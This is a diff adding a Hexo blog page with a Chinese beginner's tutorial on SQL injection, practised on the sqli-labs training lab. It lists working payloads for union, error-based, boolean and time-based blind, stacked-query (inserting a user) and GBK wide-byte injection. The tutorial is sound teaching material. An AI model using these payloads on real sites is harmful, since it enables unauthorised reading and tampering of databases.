@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>lhix Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="lhix Blog">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="lhix Blog">
+<meta property="og:locale">
+<meta property="article:author" content="lhix404">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="lhix Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">lhix Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-SQL注入基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/16/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2020-11-16T10:52:48.000Z" itemprop="datePublished">2020-11-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/16/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">SQL注入基础</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="SQL注入的基本原理："><a href="#SQL注入的基本原理：" class="headerlink" title="SQL注入的基本原理："></a>SQL注入的基本原理：</h2><p>当程序员在编写<em>SQL语言</em>时直接将用户的输入与SQL语言进行连接，并且没有对用户的输入进行足够的过滤，使得用户可以通过注入恶意的SQL语句，从而修改数据库中的原有信息，获得网站的webshell，以及设置后门等一系列恶意操作。</p>
+<h2 id="SQL注入的基本方式"><a href="#SQL注入的基本方式" class="headerlink" title="SQL注入的基本方式"></a>SQL注入的基本方式</h2><table>
+<thead>
+<tr>
+<th>基本注入方式</th>
+<th>注入的条件</th>
+<th>没有对应条件的解决办法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>联合查询</td>
+<td>页面有回显</td>
+<td>下一方法</td>
+</tr>
+<tr>
+<td>报错注入</td>
+<td>页面有报错</td>
+<td>下一方法</td>
+</tr>
+<tr>
+<td>布尔盲注</td>
+<td>页面有布尔类型状态</td>
+<td>下一方法</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td>页面无前三种状态</td>
+<td>绝招</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>基本注入方式</th>
+<th>注入条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>堆叠查询</td>
+<td>开启多语句查询</td>
+</tr>
+<tr>
+<td>宽字节注入</td>
+<td>MySQL使用GBK编码</td>
+</tr>
+<tr>
+<td>二次注入</td>
+<td>特殊情况下</td>
+</tr>
+</tbody></table>
+<h2 id="SQL注入的基本思路"><a href="#SQL注入的基本思路" class="headerlink" title="SQL注入的基本思路:"></a>SQL注入的基本思路:</h2><p>（以下playload可以在sqli-labs中实现）</p>
+<h4 id="1-判断属于字符型还是数字型闭合"><a href="#1-判断属于字符型还是数字型闭合" class="headerlink" title="1.判断属于字符型还是数字型闭合"></a>1.判断属于字符型还是数字型闭合</h4><p>使用   ?id=1’<br>如果数字1出现在报错信息中则为字符型（如果?id=1’后面出现双引号(‘’1’”)，则为双引号闭合。如果出现单引号(‘1’’)，则为单引号闭合）。<br>如果1没有出现，则为数字型闭合。</p>
+<h4 id="2-判断字段个数column"><a href="#2-判断字段个数column" class="headerlink" title="2.判断字段个数column"></a>2.判断字段个数column</h4><p>闭合前一条sql语句，使用order by（按字段数进行排序）判断列数。<br>例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>’ order by <span class="number">1</span> --+</span><br><span class="line">?id=<span class="number">1</span>’ order by <span class="number">4</span> --+</span><br></pre></td></tr></table></figure>
+<p>当输入的数字大于字段数时，系统就会报出错误（unknown column）。</p>
+<h4 id="3-闭合前后的SQL语句"><a href="#3-闭合前后的SQL语句" class="headerlink" title="3.闭合前后的SQL语句"></a>3.闭合前后的SQL语句</h4><p>1）使用第一步中测试出的引号来闭合前面的sql语句。<br>例如单引号闭合： ?id=1’</p>
+<p>2）对于后面的语句就使用注释来进行闭合。<br>常见的注释语句：<br>1）–+<br>2）#<br>3）/* ……… */</p>
+<p>或者使用闭合单引号的方法来闭合后面的SQL语句：<br>例如</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// palyload：</span></span><br><span class="line">?id=<span class="number">404</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h4 id="4-判断注入显示位置"><a href="#4-判断注入显示位置" class="headerlink" title="4.判断注入显示位置"></a>4.判断注入显示位置</h4><p>palyload: ?id=-1’ union select 1,2,3–+<br>查看页面中数字出现的位置，即为注入显示的位置。</p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>联合查询使用UNION 操作符合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。同时，每条SELECT语句中的列的顺序必须相同。此外联合查询的两条结果，系统默认只显示第一条，所以需要将第一条SQL语句置为假，才会显示第二条语句的内容。</p>
+<blockquote>
+<p>例：Playload： ?id=-1’ union select 1,user(),version()–+<br>         或者 ?id=1’ and 1=2 union select 1,user(),version() –+</p>
+</blockquote>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>常见的报错注入：</p>
+<p>updatexml报错(XPATH报错)：</p>
+<blockquote>
+<p>Playload：  ?id=1’ and updatexml(1,concat(0x7e,(select version()),0x7e),1)–+</p>
+</blockquote>
+<p>Floor报错</p>
+<blockquote>
+<p>Palyload：?id=1’ and(select 1 from(select count(*),concat((select(select(select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) –+</p>
+</blockquote>
+<p>extractvalue报错（XPATH报错）</p>
+<blockquote>
+<p>Palyload：?id=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))</p>
+</blockquote>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔盲注常用函数：</p>
+<blockquote>
+<p>Substr：字符串截取函数。Substr（str，start,length）.<br>Ascii(char):将字符串转换成ASCII码。</p>
+</blockquote>
+<p>判断数据库长度</p>
+<blockquote>
+<p>Palyload：  ?id=1’ and length(database())=8 –+</p>
+</blockquote>
+<p>猜测数据库名的第一位<br>（第二位为database（），2，1    以此类推）</p>
+<blockquote>
+<p>Palyload：?id=1’ and ascii(substr(database(),1,1))=115 –+</p>
+</blockquote>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注常用函数：</p>
+<blockquote>
+<p>if(cond,ture_result,flase_result)：cond为判断条件，ture_result为真时返回的结果，false_result为假时返回的结果。</p>
+</blockquote>
+<p>通常使用if配合ascii，substr函数来实现时间盲注</p>
+<p>判断闭合类型</p>
+<blockquote>
+<p>Palyload：     ?id=1’ and sleep(5) –+<br>（为’闭合时延时5s，否则没有）<br>              更改’为”，测试是否为”注入，结果与上面相同。</p>
+</blockquote>
+<p>猜测数据库名第一位</p>
+<blockquote>
+<p>Palyload：  ?id=1’ and if(ascii(substr(database(),1,1))=115,sleep(5),2)–+<br>(猜测版本的第一位是否为s，如果正常则返回sleep(5),使得界面延时5s。反正则不会。)</p>
+</blockquote>
+<p>猜测第二位为(database(),2,1)以此类推<br>根据上述palyload，可以猜测其他信息。</p>
+<h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>我们知道在mysql中，主要是命令行中，每一条语句结尾加上 ;<br>当目标开启了多语句查询时，可以使用堆叠查询：<br>试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。<br>而union injection（联合查询）也是将两条语句合并在一起，两者之间有什么区别么？<br><em>区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</em></p>
+<p>例如:插入用户：</p>
+<blockquote>
+<p>Palyload： ?1’ ; insert into users(id,username,password)      values(‘11’,’11’,’11’) –+</p>
+</blockquote>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为 \’。</p>
+<p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：<br>1）%df 吃掉 \<br>例如 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2）将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法。</p>
+<blockquote>
+<p>例：palyload ： ?id=-1%df%27 union select 1,user(),3–+</p>
+</blockquote>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入是指输入提交的语句，无法直接对 WEB 应用程序产生影响，而是先注入到数据库中，再通过读取数据库的操作对 WEB 产生危害，这样的注入就被称为是二次注入。二次注入较为复杂这里不进行详细介绍。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文为个人原创，小白一枚，如有错误的地方，欢迎大家赐教。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/16/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" data-id="ckhkfpql000002wu9gkq992na" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/16/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">SQL注入基础</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 lhix404<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
